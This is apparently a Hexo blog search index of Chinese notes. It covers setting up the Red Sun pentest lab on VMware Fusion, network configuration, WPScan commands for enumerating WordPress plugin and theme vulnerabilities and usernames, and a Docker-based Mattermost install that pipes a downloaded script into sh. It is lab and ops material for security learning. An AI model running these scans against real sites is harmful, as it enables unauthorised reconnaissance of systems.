<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MacOS&amp;VMwareFusion红日靶场搭建</title>
      <link href="/2022/07/28/MacOS-VMwareFusion%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/07/28/MacOS-VMwareFusion%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/u010476994/article/details/104001848">https://blog.csdn.net/u010476994/article/details/104001848</a></p><p><a href="https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">https://mo-onstudy.com/2022/01/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</a></p><h3 id="VMware-Fusion配置"><a href="#VMware-Fusion配置" class="headerlink" title="VMware Fusion配置"></a>VMware Fusion配置</h3><p>在mac命令行里，修改关于VMware Fusion网卡到配置文件，改打了注释的地方即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/networking</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">VERSION=1,0</span><br><span class="line">answer VNET_1_DHCP no//修改</span><br><span class="line">answer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591</span><br><span class="line">answer VNET_1_HOSTONLY_NETMASK 255.255.255.0//修改</span><br><span class="line">answer VNET_1_HOSTONLY_SUBNET 192.168.52.0//修改</span><br><span class="line">answer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0</span><br><span class="line">answer VNET_1_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_8_DHCP no//修改</span><br><span class="line">answer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89</span><br><span class="line">answer VNET_8_HOSTONLY_NETMASK 255.255.255.0//修改</span><br><span class="line">answer VNET_8_HOSTONLY_SUBNET 192.168.11.0//修改</span><br><span class="line">answer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803</span><br><span class="line">answer VNET_8_NAT yes</span><br><span class="line">answer VNET_8_VIRTUAL_ADAPTER yes</span><br></pre></td></tr></table></figure><p>修改vmnet8网关：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf</span><br></pre></td></tr></table></figure><p>修改为：（修改添加了注释的地方即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.11.2//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.11.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet8</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure><p>修改vmnet1网关</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet1/nat.conf</span><br></pre></td></tr></table></figure><p>修改为：（修改添加了注释的地方即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.52.2//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.52.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet1</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure><p>如上修改后，VMware Fusion的NAT模式默认网段就变成了192.168.11.0&#x2F;24，仅主机模式默认网段就变成了192.168.52.0&#x2F;24</p><h3 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h3><p>给虚拟机新建一张网卡</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281538264.png" alt="image-20220728153844985"></p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281540408.png" alt="image-20220728154009085"></p><p>然后将新建的网卡配置为nat模式，设置地址为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.11.123</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.11.2</span><br></pre></td></tr></table></figure><p>检查原本存在的网卡，该网卡为仅主机模式，地址应该为：（不用修改，红日靶场给内网都配了固定的IP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.xxx</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.52.2</span><br></pre></td></tr></table></figure><p>这样win7作为内外网边界的一个角色，就搭建好了，192.168.11.123对外服务，192.168.52.xxx对内通信，内外网隔离。</p><p>配置内网两台主机：</p><p>win server 2003</p><p>配置为仅主机模式</p><p>win server 2008</p><p>配置为仅主机模式</p><h3 id="解决mac与内网仍然互通问题"><a href="#解决mac与内网仍然互通问题" class="headerlink" title="解决mac与内网仍然互通问题"></a>解决mac与内网仍然互通问题</h3><p>预期拓扑结构</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281546226.png"></p><p>按以上步骤搭建完成后，测试网络环境发现。</p><p>mac可以联通边界地址192.168.11.123，也就是win7的NAT网卡，这是正常的，我们需要通过这个地址对外提供web服务。（由于win7开了防火墙，ping192.168.11.123是不通的，但是打开phpstudy之后，访问web服务应该是正常的）</p><p>mac可以ping通192.168.52.xxx，这是不正常的，因为mac作为物理攻击机，应当只能访问门户，而不能接触到作为内网的192.168.52.xxx网段。</p><p>经过思考和查询资料，小乱发现，可以通过以下方法将内网与mac物理机隔离开来。</p><p><strong>外网环境</strong></p><p>win7的NAT网卡配置不变，地址依旧为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.11.123</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.11.2</span><br></pre></td></tr></table></figure><p><strong>内网环境</strong></p><p>新增一个虚拟网络：</p><p>VMware Fusion–偏好设置–网络</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207291716209.png" alt="image-20220729171656926"></p><p>把新网卡的子网地址设置为192.168.52.0&#x2F;24（如果与vmnet1地址冲突，别忘了把vmnet1的子网地址改成其他的）</p><p>配置虚拟网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/networking</span><br></pre></td></tr></table></figure><p>打开后会发现里面多了一些vmnet2的配置，这是自动配好的，把dhcp设置改为no，vmnet1改成其他不冲突的地址即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">VERSION=1,0</span><br><span class="line">answer VNET_1_DHCP no</span><br><span class="line">answer VNET_1_DHCP_CFG_HASH F7F79C241EC928D7CA1121B015C2AA4719D12591</span><br><span class="line">answer VNET_1_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_1_HOSTONLY_SUBNET 192.168.222.0//修改</span><br><span class="line">answer VNET_1_HOSTONLY_UUID FABDE6B9-8968-40BE-AC6B-9CB97CAD19E0</span><br><span class="line">answer VNET_1_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_2_DHCP no//修改</span><br><span class="line">answer VNET_2_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_2_HOSTONLY_SUBNET 192.168.52.0</span><br><span class="line">answer VNET_2_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_8_DHCP no</span><br><span class="line">answer VNET_8_DHCP_CFG_HASH A8C956D502720409073060FB037B694D21771B89</span><br><span class="line">answer VNET_8_HOSTONLY_NETMASK 255.255.255.0</span><br><span class="line">answer VNET_8_HOSTONLY_SUBNET 192.168.11.0</span><br><span class="line">answer VNET_8_HOSTONLY_UUID E4426FB6-0333-4D3F-84AF-B4ED8B73D803</span><br><span class="line">answer VNET_8_NAT yes</span><br><span class="line">answer VNET_8_VIRTUAL_ADAPTER yes</span><br></pre></td></tr></table></figure><p>配置网关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /Library/Preferences/VMware\ Fusion/vmnet2/nat.conf</span><br></pre></td></tr></table></figure><p>配置为192.168.52.2，如果vmnet2下没有nat.conf文件，从vmnet8下复制过来修改即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.52.2//修改为网关地址</span><br><span class="line">netmask = 255.255.255.0//修改为网关地址</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 192.168.52.127</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet1</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines</span><br></pre></td></tr></table></figure><p>然后把所有内网网卡绑定到这个虚拟网络</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281601483.png"></p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207281603566.png"></p><p>测试联通性，发现mac物理机，仍然可以ping通192.168.52.0网段，这是因为新建的vmnet2虚拟网络中，mac是默认存在于这个网络中的，即192.168.52.1</p><p>mac命令行使用ifconfig查看当前网络情况，可以发现一张网卡拥有192.168.52.1这个网络地址</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207291730669.png" alt="image-20220729173032667"></p><p>禁用这张网卡即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig bridge101 down</span><br></pre></td></tr></table></figure><p>然后再尝试用mac去ping192.168.52.0网段，发现已经ping不通了。</p><p>注：不要去ping win7，因为防火墙默认禁ping的关系，无论网络是否联通，win7都是ping不到的，它的ping测试结果没有参考意义。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，红日靶场就是三台虚拟机</p><p>win7是门户、内外网边界，有双网卡，既联通外网192.168.11.0，又联通内网192.168.52.0</p><p>win 2k3和win 2008是纯内网，不与外网联通，外网无法直接访问到这两台服务器</p><p>mac是攻击机，是外来访问设备，只能访问win7提供的网络服务，而无法接触到192.168.52.0网段，即内网。</p><p>而在实际环境搭建过程中，win7以nat方式与mac联通，mac在vmnet8虚拟网络中，以192.168.11.1的身份存在</p><p>win7的内网网卡，win 2k3，win 2008，以vmnet2虚拟网络联通，而默认情况下，mac也处于这个网络中，以192.168.52.1的身份存在</p><p>因此，只要将mac中，联通vmnet2的虚拟网卡禁用，mac就从vmnet2这个虚拟网络中消失了，而只与win7的nat网卡相连接，存在于vmnet8这个虚拟网络中，以192.168.11.1这个身份存在</p><p>者就复合了红日靶场的拓扑构想，接下来，就可以愉快的以攻击者身份，获得win7的控制权，从而以win7为跳板攻击192.168.52.0内网网段了。</p>]]></content>
      
      
      <categories>
          
          <category> 1.环境部署 </category>
          
          <category> 2.靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VMwareFusion网络配置</title>
      <link href="/2022/07/28/VMwareFusion%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/28/VMwareFusion%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://blog.csdn.net/u010476994/article/details/104001848">https://blog.csdn.net/u010476994/article/details/104001848</a></p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>下文仅最基础的配置内容，其他更深入的用法如有需要请自行挖掘。</p><p>默认三种模式：</p><p>仅主机模式（vmnet1）：vmnet1网内互通，不通外网</p><p>NAT模式（vmnet8）：做nat地址转换，网内相当于一个局域网，局域网所有虚拟主机全部使用物理机的IP对外通信</p><p>桥接模式：以与主机平等的地位连接外部网络，获取一个真实的网络地址，外网机器也可以访问到桥接虚拟机</p><h3 id="配置过程"><a href="#配置过程" class="headerlink" title="配置过程"></a>配置过程</h3><p>网卡配置文件：&#x2F;Library&#x2F;Preferences&#x2F;VMware\ Fusion&#x2F;networking</p><p>在这个文件里设置虚拟网卡的子网网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">VERSION=1,0</span><br><span class="line">answer VNET_1_DHCP no//是否开启DHCP服务，自动分配IP</span><br><span class="line">answer VNET_1_DHCP_CFG_HASH 4D09D33BA7EDB1D704764C3C6A07F54E6BF69D13</span><br><span class="line">answer VNET_1_HOSTONLY_NETMASK 255.255.255.0//设置vmnet1的子网掩码</span><br><span class="line">answer VNET_1_HOSTONLY_SUBNET 192.168.52.0//设置vmnet1子网网段</span><br><span class="line">answer VNET_1_VIRTUAL_ADAPTER yes</span><br><span class="line">answer VNET_8_DHCP yes//是否开启DHCP服务，自动分配IP</span><br><span class="line">answer VNET_8_DHCP_CFG_HASH 631E6B5B1E84A9C5E2705EBD7065966C97B30E5E</span><br><span class="line">answer VNET_8_HOSTONLY_NETMASK 255.255.255.0//设置vmnet8的子网掩码</span><br><span class="line">answer VNET_8_HOSTONLY_SUBNET 172.16.190.0//设置vmnet8的子网网段</span><br><span class="line">answer VNET_8_NAT yes</span><br><span class="line">answer VNET_8_VIRTUAL_ADAPTER yes</span><br></pre></td></tr></table></figure><p>单张网卡配置文件：&#x2F;Library&#x2F;Preferences&#x2F;VMware\ Fusion&#x2F;vmnet8&#x2F;nat.conf</p><p>​  &#x2F;Library&#x2F;Preferences&#x2F;VMware\ Fusion&#x2F;vmnet8&#x2F;nat.conf</p><p>在这里配置单张虚拟网卡的网关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># VMware NAT configuration file</span><br><span class="line"># Manual editing of this file is not recommended. Using UI is preferred.</span><br><span class="line"></span><br><span class="line">[host]</span><br><span class="line"></span><br><span class="line"># Use MacOS network virtualization API</span><br><span class="line">useMacosVmnetVirtApi = 1</span><br><span class="line"></span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 172.16.190.1//设置网关</span><br><span class="line">netmask = 255.255.255.0</span><br><span class="line"></span><br><span class="line"># Last DHCP address</span><br><span class="line">lastDhcpAddress = 172.16.190.127//设置dhcp分配起始地址</span><br><span class="line"></span><br><span class="line"># VMnet device if not specified on command line</span><br><span class="line">device = vmnet8</span><br><span class="line"></span><br><span class="line"># Allow PORT/EPRT FTP commands (they need incoming TCP stream ...)</span><br><span class="line">activeFTP = 1</span><br><span class="line"></span><br><span class="line"># Allows the source to have any OUI.  Turn this on if you change the OUI</span><br><span class="line"># in the MAC address of your virtual machines.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.环境部署 </category>
          
          <category> 1.其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wordpress:自动化利用工具-WPscan</title>
      <link href="/2022/07/24/wordpress-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-WPscan/"/>
      <url>/2022/07/24/wordpress-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-WPscan/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://phptechworld.com/blog/detail/0060f0139455d274043d1c5aa5ff1018">https://phptechworld.com/blog/detail/0060f0139455d274043d1c5aa5ff1018</a></p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wpscan --api-token xxxxxxxxxxxx --url http://example.com</span><br><span class="line">wpscan --url http://xxx.xxx -e p//扫描插件</span><br><span class="line">wpscan --api-token xxxxxxxxxxxxxxx --url http://xxx.xxx -e vp//扫描插件漏洞</span><br><span class="line">wpscan --url http://xxx.xxx -e t//扫描主题</span><br><span class="line">wpscan --api-token xxxxxxxxxxxxxxx --url http://xxx.xxx -e vt//扫描主题漏洞</span><br><span class="line">wpscan --url http://xxx.xxx -e u//暴力枚举用户名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mattermost部署</title>
      <link href="/2022/07/21/mattermost%E9%83%A8%E7%BD%B2/"/>
      <url>/2022/07/21/mattermost%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://lala.im/8334.html">https://lala.im/8334.html</a></p><h3 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h3><p>安装docker和docker-compose，尽量照下面命令装1.x的docker-compose，高版本部署的时候可能会出问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt -y update</span><br><span class="line">apt -y install curl</span><br><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh</span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>新建项目目录，进入项目目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/mattermost &amp;&amp; cd /opt/mattermost</span><br></pre></td></tr></table></figure><p>新建compose文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi docker-compose.yml</span><br></pre></td></tr></table></figure><p>写入配置，这里原文有坑，ports参数那里，要从127.0.0.1:8065:8065修改到8065:8065，即删掉ip地址，不然会只有本地能访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3.5&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  postgres:</span><br><span class="line">    container_name: postgres_mattermost</span><br><span class="line">    image: postgres:13-alpine</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    security_opt:</span><br><span class="line">      - no-new-privileges:true</span><br><span class="line">    pids_limit: 100</span><br><span class="line">    read_only: true</span><br><span class="line">    tmpfs:</span><br><span class="line">      - /tmp</span><br><span class="line">      - /var/run/postgresql</span><br><span class="line">    env_file:</span><br><span class="line">      - .env</span><br><span class="line">    volumes:</span><br><span class="line">      - ./volumes/db:/var/lib/postgresql/data</span><br><span class="line"></span><br><span class="line">  mattermost:</span><br><span class="line">    container_name: mattermost</span><br><span class="line">    image: mattermost/mattermost-team-edition:6.5</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    depends_on:</span><br><span class="line">      - postgres</span><br><span class="line">    security_opt:</span><br><span class="line">      - no-new-privileges:true</span><br><span class="line">    pids_limit: 200</span><br><span class="line">    read_only: false</span><br><span class="line">    tmpfs:</span><br><span class="line">      - /tmp</span><br><span class="line">    env_file:</span><br><span class="line">      - .env</span><br><span class="line">    ports:</span><br><span class="line">      - 8065:8065</span><br><span class="line">    volumes:</span><br><span class="line">      - ./volumes/app/mattermost/config:/mattermost/config:rw</span><br><span class="line">      - ./volumes/app/mattermost/data:/mattermost/data:rw</span><br><span class="line">      - ./volumes/app/mattermost/logs:/mattermost/logs:rw</span><br><span class="line">      - ./volumes/app/mattermost/plugins:/mattermost/plugins:rw</span><br><span class="line">      - ./volumes/app/mattermost/client/plugins:/mattermost/client/plugins:rw</span><br><span class="line">      - ./volumes/app/mattermost/bleve-indexes:/mattermost/bleve-indexes:rw</span><br></pre></td></tr></table></figure><p>新建env</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi .env配置文件</span><br></pre></td></tr></table></figure><p>输入如下内容到.env，里面的imlala和password可以替换成你自己的，也可以默认，这个就是最后docker环境里的用户名密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POSTGRES_DB=mattermost</span><br><span class="line">POSTGRES_USER=imlala</span><br><span class="line">POSTGRES_PASSWORD=password</span><br><span class="line">MM_SQLSETTINGS_DRIVERNAME=postgres</span><br><span class="line">MM_SQLSETTINGS_DATASOURCE=postgres://imlala:password@postgres:5432/mattermost?sslmode=disable&amp;connect_timeout=10</span><br><span class="line">MM_BLEVESETTINGS_INDEXDIR=/mattermost/bleve-indexes</span><br><span class="line">MM_SERVICESETTINGS_SITEURL=https://chat.example.com</span><br></pre></td></tr></table></figure><p>创建项目需要的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ./volumes/app/mattermost/&#123;config,data,logs,plugins,client/plugins,bleve-indexes&#125;</span><br></pre></td></tr></table></figure><p>给予正确的目录权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R 2000:2000 ./volumes/app/mattermost</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>nginx我没签，这个不配https的话应该不用，直接访问ip加端口即可访问面板。</p><p>有需求的，可以看参考链接。</p>]]></content>
      
      
      <categories>
          
          <category> 1.环境部署 </category>
          
          <category> 1.其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HUAWEI-Nexus6P回刷官方镜像</title>
      <link href="/2022/07/07/HUAWEI-Nexus6P%E5%9B%9E%E5%88%B7%E5%AE%98%E6%96%B9%E9%95%9C%E5%83%8F/"/>
      <url>/2022/07/07/HUAWEI-Nexus6P%E5%9B%9E%E5%88%B7%E5%AE%98%E6%96%B9%E9%95%9C%E5%83%8F/</url>
      
